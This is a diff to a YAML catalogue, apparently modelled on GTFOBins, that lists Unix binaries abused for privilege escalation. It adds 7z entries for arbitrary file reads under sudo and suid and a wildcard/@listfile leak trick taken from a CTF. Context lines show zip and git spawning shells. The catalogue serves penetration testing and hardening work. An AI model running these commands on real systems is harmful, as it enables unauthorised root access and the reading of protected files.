@@ -128,6 +128,14 @@
     - {func: shell, code: "TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh #'; rm $TF"}
     - {func: sudo, code: "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'; rm $TF"}
 
+- bin: 7z
+  functions:
+    - {func: file-read, code: "7z a -an -txt -si -so /dev/null <file_to_read"}
+    - {func: sudo, code: "sudo 7z a -an -txt -si -so /dev/null <file_to_read"}
+    - {func: suid, code: "7z a -an -txt -si -so /dev/null <file_to_read"}
+    # wildcard/@listfile read: an empty `@target` file + a symlink whose name is listed makes
+    # `7z a arc *` try to read the target as a file-list and leak it via a stderr error (HTB CTF)
+
 - bin: git
   functions:
     - {func: shell, code: "git help config  # then !/bin/sh (uses the pager)"}
